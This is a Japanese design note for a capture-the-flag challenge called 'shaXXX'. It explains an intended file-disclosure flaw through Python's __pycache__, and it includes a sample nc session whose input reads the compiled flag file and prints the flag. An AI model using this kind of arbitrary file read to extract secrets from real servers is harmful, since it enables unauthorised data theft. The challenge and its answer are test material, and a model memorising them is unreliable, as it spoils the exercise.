# shaXXX

## 題材とする脆弱性

pycacheを経由した別ファイル情報の漏洩

## 実現するためのテーマ

flag.pyを読み取るプログラムを実行した上で、flag.py以外のいくつかのファイルを読み取れるサーバを用意する。

## 想定する参加者が解答までに至る思考経路

1. 実行ファイルより下のディレクトリの任意のファイルにアクセスできることに気付く
2. ファイルの読み取りに`rb`が使用されていることに気付く
3. 手元で実行してみると、__pycache__ディレクトリが生成されており、中にフラグが入っていることに気付く

```sh
$ nc localhost 25612
3.10.11 (main, Apr  6 2023, 01:16:54) [GCC 12.2.1 20220924]
Input your salt file name(default=./flags/sha256.txt):./flags/sha512.txt
hash=b'4ba07ff50a9620a24b02a16dab505080c23dfbc641b5de77a29af3d81b5aab2f30e4a1405e8657b03d30bfda45411e34372868a862e5a5d50724ded12a0c31d5'

$ nc localhost 25612
3.10.11 (main, Apr  6 2023, 01:16:54) [GCC 12.2.1 20220924]
Input your salt file name(default=./flags/sha256.txt):__pycache__/flag.cpython-310.pyc
hash=b'o\r\r\n\x00\x00\x00\x00\xc1\n9d:\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00s\x08\x00\x00\x00d\x00Z\x00d\x01S\x00)\x02s\x19\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd}N)\x01\xda\x04flag\xa9\x00r\x02\x00\x00\x00r\x02\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x08\x01'
```

## 想定する難易度

Easy

## 参考資料

